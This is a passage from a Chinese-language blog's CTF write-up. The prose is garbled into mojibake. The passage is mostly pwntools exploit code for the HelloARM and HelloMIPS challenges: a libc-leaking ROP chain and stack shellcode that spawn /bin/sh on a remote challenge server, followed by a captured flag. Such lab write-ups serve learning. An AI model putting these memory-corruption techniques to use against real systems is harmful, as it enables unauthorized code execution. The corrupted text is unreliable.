</span></span><span style=display:flex><span>offset <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>functions[<span style=color:#e6db74>&#39;system&#39;</span>]<span style=color:#f92672>.</span>address <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>functions[<span style=color:#e6db74>&#39;write&#39;</span>]<span style=color:#f92672>.</span>address
</span></span><span style=display:flex><span>write_addr <span style=color:#f92672>=</span> elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#34;write&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_sh</span>(other_libc<span style=color:#f92672>=</span>null):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.210&#39;</span>, <span style=color:#ae81ff>7777</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e># global libc</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># if args[&#39;REMOTE&#39;]:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     if other_libc is not null:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#         libc = ELF(&#34;./&#34;, checksec = False)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     return remote(&#39;10.104.255.210&#39;, 7777)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># elif Debug:</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     sh = process([&#34;qemu-aarch64&#34;, &#34;-g&#34;, &#34;2333&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     log.info(&#39;Please use GDB remote!(Enter to continue)&#39;)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     raw_input()</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     return sh</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># else :</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#     return process([&#34;qemu-aarch64&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloARM&#34;])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn <span style=color:#f92672>=</span> get_sh()
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>bb <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>hex_magic <span style=color:#f92672>=</span> bb[<span style=color:#ae81ff>15</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>addr_magic <span style=color:#f92672>=</span> int(hex_magic, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>guess_fd <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>flag_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x20</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>_______&#39;</span>)
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;Set your message:&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x100</span>)<span style=color:#f92672>.</span>encode()  <span style=color:#75715e># å¡«å……</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)  <span style=color:#75715e># x29</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AD0</span>)  <span style=color:#75715e># x30 for ret to __libc</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># addr_magic-0x10 for w</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400730</span>)  <span style=color:#75715e># set to write func pointer</span>
</span></span><span style=display:flex><span><span style=color:#75715e># addr_magic-0x08 for r</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400760</span>)  <span style=color:#75715e># set to read func pointer</span>
</span></span><span style=display:flex><span><span style=color:#75715e># addr_magic</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)  <span style=color:#75715e># addr_magic for x19</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)  <span style=color:#75715e># addr_magic + 0x8 for system() address</span>
</span></span><span style=display:flex><span><span style=color:#75715e># addr_magic + 0x10 for arg 0</span>
</span></span><span style=display:flex><span>a1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> a1
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> ((<span style=color:#ae81ff>0x20</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> len(a1))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># x29</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x30</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>)  <span style=color:#75715e># for ret to __libc stage 2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># padding</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x20</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)  <span style=color:#75715e># to compare with x19, mark write() finished</span>
</span></span><span style=display:flex><span><span style=color:#75715e># x21</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x22</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x23</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000411038</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x24</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># x29</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x30</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># padding</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x20</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark read() finished</span>
</span></span><span style=display:flex><span><span style=color:#75715e># x21</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x22</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x23</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x24</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># x29</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x30</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000400AB0</span>) <span style=color:#75715e># for ret to __libc stage 2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># padding</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x20</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>) <span style=color:#75715e># to compare with x19, mark read() finished</span>
</span></span><span style=display:flex><span><span style=color:#75715e># x21</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(addr_magic <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x22</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x0000000000411080</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x23</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># x24</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>addr_libc_write <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recv(numb<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;addr_libc_write: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(addr_libc_write[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>hex()))
</span></span><span style=display:flex><span>addr_libc_system <span style=color:#f92672>=</span> p64(
</span></span><span style=display:flex><span>    offset <span style=color:#f92672>+</span> int<span style=color:#f92672>.</span>from_bytes(addr_libc_write, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>))
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;addr_libc_system: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(addr_libc_system[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>hex()))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>send(addr_libc_system)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p>æ‰§è¡ŒåæˆåŠŸgetshellï¼š</p><p><img src=/images/blog/66/image-20201019142513403.png alt=image-20201019142513403></p><h2 id=hellomips>HelloMIPS</h2><p>è¿™é¢˜å’Œarmçš„é‚£é¢˜æ¯”è¾ƒç›¸ä¼¼ï¼Œä¹Ÿæ˜¯ROPï¼Œä½†æ˜¯æ¯”armçš„ç®€å•ä¸€äº›ï¼Œç»™çš„ç¨‹åºåŒ…å«ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><pre tabindex=0><code>Archive:  ./HelloMIPS-833e170bbe2429fe66aae530c279c67b.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     7260  2020-10-03 14:52   HelloMIPS
        0  2020-10-04 22:27   lib/
   552634  2009-04-05 18:09   lib/libuClibc-0.9.30.1.so
    28971  2009-04-05 18:09   lib/ld-uClibc-0.9.30.1.so
---------                     -------
   588865                     4 files
</code></pre><p>checksecçœ‹ä¸€ä¸‹ï¼š</p><p><img src=/images/blog/66/image-20201019142817343.png alt=image-20201019142817343></p><p>æ˜¯mipselå°ç«¯çš„ç¨‹åºï¼Œæ²¡æœ‰å¼€ä»»ä½•çš„é€‰é¡¹ï¼Œé‚£ä¹ˆè¿™é¢˜å¾ˆå¯èƒ½è¦åœ¨æ ˆä¸Šæ‰§è¡Œä»£ç äº†ã€‚</p><p>å…ˆç”¨qemuè·‘ä¸€ä¸‹ç¨‹åºï¼š</p><pre tabindex=0><code>qemu-mipsel -L ./ ./HelloMIPS
</code></pre><p><img src=/images/blog/66/image-20201019143112985.png alt=image-20201019143112985></p><p>æ€»çš„æ¥è¯´ç¨‹åºå…ˆè¦æ±‚ä¸€ä»½è¾“å…¥ï¼Œç„¶åç»™å‡ºä¸€ä¸ªMagic numberï¼Œä¹‹åä¼šæœ‰ä¸€æ¬¡è¾“å…¥ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾ã€‚</p><p>å¯åŠ¨idaæ¥åˆ†æè¿™ä¸ªç¨‹åºï¼š</p><p>ç¨‹åºå’ŒHelloARMçš„æ¯”è¾ƒç›¸ä¼¼ï¼Œä½†æ˜¯mainå‡½æ•°ä¸­æ²¡æœ‰buffï¼Œç¬¬ä¸€æ¬¡è¯»å–çš„<code>0xF</code>ä¸ªå­—èŠ‚çš„å†…å®¹è¢«å†™å…¥åˆ°bssæ®µçš„<code>NAME</code>æ•°ç»„ä¸­ã€‚ä¹‹åè°ƒç”¨çš„<code>oooooo()</code>å‡½æ•°ä¹Ÿå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºï¼Œä½†æ˜¯ä¸ARMçš„æ±‡ç¼–ä¸åŒçš„æ˜¯ï¼Œå­˜æ”¾è¿”å›åœ°å€çš„ä½ç½®åœ¨ç¼“å†²åŒºçš„ä¸Šæ–¹ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ«æŒ<code>oooooo()</code>çš„è¿”å›æŒ‡ä»¤ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦mipselçš„å‡½æ•°è°ƒç”¨è§„åˆ™ï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼šhttps://blog.csdn.net/gujing001/article/details/8476685</p><p>ç®€å•æ¥è¯´ï¼Œmipselçš„å‡½æ•°è°ƒç”¨ï¼Œè¿”å›åœ°å€å­˜æ”¾åœ¨<code>$ra</code>å¯„å­˜å™¨ä¸­ã€‚å¦å¤–mipselæ¯æ¬¡è°ƒç”¨åº“å‡½æ•°æ—¶ï¼Œä¼šå…ˆä»<code>.got</code>è¡¨ä¸­å¯¹åº”çš„é¡¹ä¸­å–å‡ºç›®æ ‡å‡½æ•°åœ°å€ï¼Œæ”¾å…¥<code>$t9</code>å¯„å­˜å™¨ç„¶åç”¨<code>jalr $9</code>è·³å…¥è¯¥ç›®æ ‡å‡½æ•°ã€‚å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œ<code>.got</code>è¡¨ä¸­æŒ‡å‘çš„ä¼šæ˜¯è¯¥å‡½æ•°åœ¨<code>.plt</code>è¡¨ä¸­çš„å¯¹åº”ä»£ç ï¼ŒåŠ è½½å®Œæˆåä¼šä¿®æ”¹<code>.got</code>è¡¨é¡¹ã€‚</p><p>æœ€åæ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>å…ˆåŠ«æŒ<code>oooooo()</code>çš„è¿”å›åœ°å€ï¼Œè·³è½¬åˆ°bssæ®µä¸Šï¼Œbssçš„åœ°å€æ˜¯é™æ€çš„ï¼Œå› æ­¤å¯ä»¥å®ç° ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¦åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶ï¼Œå¾€bssä¸Šæ”¾ç½®è·³æ¿ä»£ç ã€‚</li><li>bssä¸Šçš„ä»£ç ä¸»è¦æ˜¯è¯»å–æ ˆæŒ‡é’ˆ<code>$sp</code>å¹¶è·³è½¬åˆ°æ ˆä¸Šçš„åœ°å€æ‰§è¡Œä»£ç </li><li>ç¬¬äºŒæ¬¡è¾“å…¥æ—¶ï¼Œéœ€è¦åœ¨æ ˆä¸Šå¡«å……ä»£ç ï¼Œè°ƒç”¨<code>system()</code>å‡½æ•°ï¼ˆå®ƒçš„åœ°å€å°±æ˜¯ç»™å‡ºçš„magic numberçš„å€¼ï¼‰ï¼Œ<code>/bin/sh</code>å­—ç¬¦ä¸²å¯ä»¥æ”¾åœ¨æ ˆä¸Šï¼Œä½†æ˜¯è¦æ”¾åœ¨<code>$sp</code>æŒ‡é’ˆçš„åé¢ï¼Œå¦åˆ™åœ¨è°ƒç”¨<code>system()</code>å‡½æ•°æ—¶ä¼šè¦†ç›–æ‰ã€‚</li></ul><p><img src=/images/blog/66/image-20201019144642666.png alt=image-20201019144642666></p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mips&#39;</span>
</span></span><span style=display:flex><span>Debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./HelloMIPS&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_sh</span>(other_libc<span style=color:#f92672>=</span>null):
</span></span><span style=display:flex><span>    <span style=color:#75715e># return process([&#34;qemu-mipsel&#34;, &#34;-L&#34;, &#34;./&#34;, &#34;./HelloMIPS&#34;])</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.211&#39;</span>, <span style=color:#ae81ff>7777</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> libc
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args[<span style=color:#e6db74>&#39;REMOTE&#39;</span>]:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> other_libc <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> null:
</span></span><span style=display:flex><span>            libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./&#34;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(<span style=color:#e6db74>&#39;10.104.255.211&#39;</span>, <span style=color:#ae81ff>7777</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> Debug:
</span></span><span style=display:flex><span>        sh <span style=color:#f92672>=</span> process([<span style=color:#e6db74>&#34;qemu-mipsel&#34;</span>, <span style=color:#e6db74>&#34;-g&#34;</span>, <span style=color:#e6db74>&#34;2333&#34;</span>, <span style=color:#e6db74>&#34;-L&#34;</span>, <span style=color:#e6db74>&#34;./&#34;</span>, <span style=color:#e6db74>&#34;./HelloMIPS&#34;</span>])
</span></span><span style=display:flex><span>        log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#39;Please use GDB remote!(Enter to continue)&#39;</span>)
</span></span><span style=display:flex><span>        raw_input()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> sh
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([<span style=color:#e6db74>&#34;qemu-mipsel&#34;</span>, <span style=color:#e6db74>&#34;-L&#34;</span>, <span style=color:#e6db74>&#34;./&#34;</span>, <span style=color:#e6db74>&#34;./HelloMIPS&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn <span style=color:#f92672>=</span> get_sh()
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;addi $t9, $sp, -0x108&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;nop&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;jalr $t9&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0xF</span><span style=color:#f92672>-</span>len(payload))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bb <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hex_magic <span style=color:#f92672>=</span> bb[<span style=color:#ae81ff>15</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>addr_magic <span style=color:#f92672>=</span> int(hex_magic, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;hex_magic: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(hex_magic))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>addr_NAME <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x440E20</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;move $a0, $sp&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;li $t9, &#39;</span> <span style=color:#f92672>+</span> hex(addr_magic))
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;nop&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;jalr $t9&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> asm(<span style=color:#e6db74>&#39;nop&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0x100</span> <span style=color:#f92672>-</span> len(payload))
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0xdeadbeef</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p32(addr_NAME)
</span></span><span style=display:flex><span><span style=color:#75715e># é‡è¦åƒæ•¸æ”¾åˆ°spåé¢é˜²æ­¢è¢«å†²æ‰ï¼ï¼ï¼ï¼ï¼</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>interactive()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># TSCTF{d561c9d2-064d-11eb-80ab-0242ac110002}</span>
</span></span></code></pre></div><p><img src=/images/blog/66/image-20201019150313905.png alt=image-20201019150313905></p></main><div id=comments><hr><script src=https://utteranc.es/client.js repo=KB5201314/KB5201314.github.io issue-term=pathname label='ğŸ’¬ comments ğŸ’¬' theme=github-light crossorigin=anonymous async></script></div><footer><hr>Â© imlk 2017 &ndash; 2023 | <a href=https://blog.imlk.top>imlk's blog</a> | <a href=https://github.com/KB5201314/>Github</a> | <a href=mailto:me@imlk.top>Email</a> | <a href=https://beian.miit.gov.cn/>äº¬ICPå¤‡ - 2020042968å·</a></footer></body></html>